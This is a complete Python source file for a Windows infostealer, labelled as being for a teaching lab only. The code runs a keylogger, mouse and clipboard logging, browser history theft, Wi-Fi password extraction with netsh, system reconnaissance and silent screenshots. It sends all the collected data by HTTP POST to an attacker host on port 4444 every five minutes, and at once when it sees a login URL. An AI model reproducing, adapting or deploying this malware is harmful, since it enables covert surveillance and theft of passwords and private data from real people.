#!/usr/bin/env python3
# ============================================================
#  ADVANCED INFOSTEALER (Windows) - SOLO LABORATORIO DIDATTICO
#  Features:
#  - Auto-install dependencies
#  - Keylogger + Human-readable parser
#  - Mouse logger
#  - Clipboard monitor
#  - Browser history extraction (Firefox, Chrome, Edge)
#  - Wi-Fi password extraction
#  - System reconnaissance (Public IP, OS, User)
#  - Silent screenshots every 60s
#  - Exfiltration every 5 mins (Zipped screenshots + logs)
#  - BONUS: Instant exfil on login URL detection
# ============================================================

import subprocess
import sys
import os

# ---------------- AUTO-INSTALL DEPENDENCIES ----------------
def install_dependencies():
    required = ['pynput', 'mss', 'pyperclip']
    for package in required:
        try:
            __import__(package)
        except ImportError:
            print(f"[*] Installing missing dependency: {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

if __name__ == "__main__":
    install_dependencies()

# ---------------- IMPORTS ----------------
import re, time, zipfile, shutil, sqlite3, tempfile, threading
import getpass, platform, urllib.request, json
from datetime import datetime
from http.client import HTTPConnection

from pynput import keyboard, mouse
import mss
import pyperclip

# ---------------- CONFIG ----------------
ATTACKER_IP      = "192.168.160.129"   # <-- IP KALI
ATTACKER_PORT    = 4444
SHOT_INTERVAL    = 60
EXFIL_INTERVAL   = 300
HISTORY_CHECK    = 30

WORK_DIR   = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")), "SysCache")
SHOT_DIR   = os.path.join(WORK_DIR, "shots")
LOG_FILE   = os.path.join(WORK_DIR, "keylog.txt")
HUMAN_LOG  = os.path.join(WORK_DIR, "human_readable_log.txt")
HIST_FILE  = os.path.join(WORK_DIR, "cronologia.txt")
WIFI_FILE  = os.path.join(WORK_DIR, "wifi_passwords.txt")
SYS_FILE   = os.path.join(WORK_DIR, "sysinfo.txt")

LOGIN_PATTERNS = re.compile(
    r"(login|log-in|signin|sign-in|logon|log-on|auth|account|"
    r"session|passwd|wp-admin|accedi|accesso)", re.IGNORECASE)

os.makedirs(SHOT_DIR, exist_ok=True)
lock = threading.Lock()
seen_logins = set()
current_line = ""
last_clipboard = ""

# ---------------- UTILS ----------------
def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def log_line(text):
    with lock, open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text + "\n")

def log_human(text):
    global current_line
    with lock:
        if text == "[Key.backspace]" or text == "'\\x08'":
            current_line = current_line[:-1]
        elif text == "[Key.space]" or text == "' '":
            current_line += " "
        elif text == "[Key.enter]" or text == "'\\r'":
            with open(HUMAN_LOG, "a", encoding="utf-8") as f:
                f.write(f"[{now()}] {current_line}\n")
            current_line = ""
        elif text.startswith("'") and text.endswith("'") and len(text) == 3:
            current_line += text[1:-1]
        elif text.startswith("[Key."):
            pass # Ignore modifiers

# ---------------- INVIO FILE ----------------
def send_file(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        conn = HTTPConnection(ATTACKER_IP, ATTACKER_PORT, timeout=10)
        conn.request("POST", "/upload", body=data,
                     headers={"X-Filename": os.path.basename(path),
                              "Content-Length": str(len(data))})
        resp = conn.getresponse(); resp.read(); conn.close()
        return True
    except Exception:
        return False

# ---------------- TASTIERA ----------------
def on_press(key):
    try:
        char = key.char
        log_line(f"[{now()}] TASTO: {repr(char)}")
        log_human(repr(char))
    except AttributeError:
        special = str(key)
        log_line(f"[{now()}] TASTO SPECIALE: {special}")
        log_human(special)

def on_release(key):
    pass

# ---------------- MOUSE ----------------
def on_click(x, y, button, pressed):
    if pressed:
        log_line(f"[{now()}] CLICK {button} @ ({x},{y})")

def on_scroll(x, y, dx, dy):
    log_line(f"[{now()}] SCROLL @ ({x},{y}) d=({dx},{dy})")

# ---------------- SCREENSHOT ----------------
def screenshot_loop():
    while True:
        try:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            with mss.mss() as sct:
                sct.shot(output=os.path.join(SHOT_DIR, f"shot_{ts}.png"))
        except Exception:
            pass
        time.sleep(SHOT_INTERVAL)

# ---------------- CLIPBOARD ----------------
def clipboard_monitor_loop():
    global last_clipboard
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard and current_clipboard.strip() != "":
                last_clipboard = current_clipboard
                log_line(f"[{now()}] *** CLIPBOARD DATA: {current_clipboard} ***")
        except Exception:
            pass
        time.sleep(3)

# ---------------- CRONOLOGIA BROWSER ----------------
LOCAL_APP_DATA = os.environ.get("LOCALAPPDATA", "")
APPDATA = os.environ.get("APPDATA", "")

HISTORY_SOURCES = [
    (os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles"), "places.sqlite",
     "SELECT p.url, p.title, v.visit_date FROM moz_places p "
     "JOIN moz_historyvisits v ON v.place_id = p.id ORDER BY v.visit_date DESC LIMIT 100"),
    (os.path.join(LOCAL_APP_DATA, "Google", "Chrome", "User Data"), "History",
     "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"),
    (os.path.join(LOCAL_APP_DATA, "Microsoft", "Edge", "User Data"), "History",
     "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"),
]

def collect_history():
    rows = []
    for base, dbname, query in HISTORY_SOURCES:
        if not os.path.isdir(base):
            continue
        for root, dirs, files in os.walk(base):
            if dbname not in files:
                continue
            src = os.path.join(root, dbname)
            tmp = os.path.join(tempfile.gettempdir(), f"hist_{datetime.now().timestamp()}.db")
            try:
                shutil.copy2(src, tmp) 
                con = sqlite3.connect(tmp)
                for url, title, _ in con.execute(query):
                    rows.append((url, title or ""))
                con.close()
            except PermissionError:
                pass # Browser aperto, salta
            except Exception:
                pass
            finally:
                if os.path.exists(tmp):
                    try: os.remove(tmp)
                    except: pass
    return rows

def write_history_file(rows):
    with lock:
        with open(HIST_FILE, "w", encoding="utf-8") as f:
            f.write(f"Cronologia browser - {now()}\n")
            for url, title in rows:
                f.write(f"{url}  |  {title}\n")
    return HIST_FILE

# ---------------- WIFI EXTRACTION ----------------
def steal_wifi_passwords():
    try:
        profiles_data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode('utf-8', errors='ignore')
        profiles = re.findall(r"All User Profile\s*:\s(.*)", profiles_data)
        
        with open(WIFI_FILE, "w", encoding="utf-8") as f:
            f.write(f"--- Wi-Fi Passwords Extracted {now()} ---\n")
            for profile in profiles:
                profile = profile.strip()
                try:
                    results = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode('utf-8', errors='ignore')
                    password_match = re.search(r"Key Content\s*:\s(.*)", results)
                    password = password_match.group(1).strip() if password_match else "N/A"
                    f.write(f"SSID: {profile} | PASSWORD: {password}\n")
                except Exception:
                    pass
        send_file(WIFI_FILE)
    except Exception:
        pass

# ---------------- SYSTEM INFO ----------------
def collect_system_info():
    try:
        try:
            ip_data = json.loads(urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5).read().decode())
            public_ip = ip_data["ip"]
        except:
            public_ip = "Unknown"

        with open(SYS_FILE, "w", encoding="utf-8") as f:
            f.write(f"=== SYSTEM RECONNAISSANCE ===\n")
            f.write(f"Timestamp: {now()}\n")
            f.write(f"Username: {getpass.getuser()}\n")
            f.write(f"Computer Name: {platform.node()}\n")
            f.write(f"OS: {platform.system()} {platform.release()} (Version: {platform.version()})\n")
            f.write(f"Architecture: {platform.machine()}\n")
            f.write(f"Public IP: {public_ip}\n")
        
        send_file(SYS_FILE)
    except Exception:
        pass

# ---------------- EXFILTRATION ----------------
def flush_and_send(only_log=False):
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        send_file(LOG_FILE)
    if os.path.exists(HUMAN_LOG) and os.path.getsize(HUMAN_LOG) > 0:
        send_file(HUMAN_LOG)
    
    send_file(write_history_file(collect_history()))
    
    if only_log:
        return
    
    shots = [os.path.join(SHOT_DIR, s) for s in os.listdir(SHOT_DIR)]
    if shots:
        zip_path = os.path.join(WORK_DIR, f"shots_{datetime.now():%Y%m%d_%H%M%S}.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
            for s in shots:
                z.write(s, os.path.basename(s))
        if send_file(zip_path):
            for s in shots:
                try: os.remove(s)
                except: pass
            try: os.remove(zip_path)
            except: pass

def exfil_loop():
    while True:
        time.sleep(EXFIL_INTERVAL)
        flush_and_send()

# ---------------- LOGIN MONITOR ----------------
def seed_seen_logins():
    global seen_logins
    for url, _ in collect_history():
        if LOGIN_PATTERNS.search(url):
            seen_logins.add(url)

def login_monitor_loop():
    while True:
        try:
            for url, _ in collect_history():
                if LOGIN_PATTERNS.search(url) and url not in seen_logins:
                    seen_logins.add(url)
                    log_line(f"[{now()}] *** LOGIN RILEVATO NELLA CRONOLOGIA: {url} ***")
                    flush_and_send(only_log=True)
        except Exception:
            pass
        time.sleep(HISTORY_CHECK)

# ---------------- MAIN ----------------
if __name__ == "__main__":
    log_line(f"\n=== Keylogger avviato {now()} ===")
    seed_seen_logins()
    
    # Start all background threads
    threading.Thread(target=screenshot_loop, daemon=True).start()
    threading.Thread(target=exfil_loop, daemon=True).start()
    threading.Thread(target=login_monitor_loop, daemon=True).start()
    threading.Thread(target=clipboard_monitor_loop, daemon=True).start()
    
    # Run one-time data collection tasks
    threading.Thread(target=steal_wifi_passwords, daemon=True).start()
    threading.Thread(target=collect_system_info, daemon=True).start()

    # Start listeners
    kb_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    kb_listener.start()
    
    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
    mouse_listener.start()
    
    mouse_listener.join()
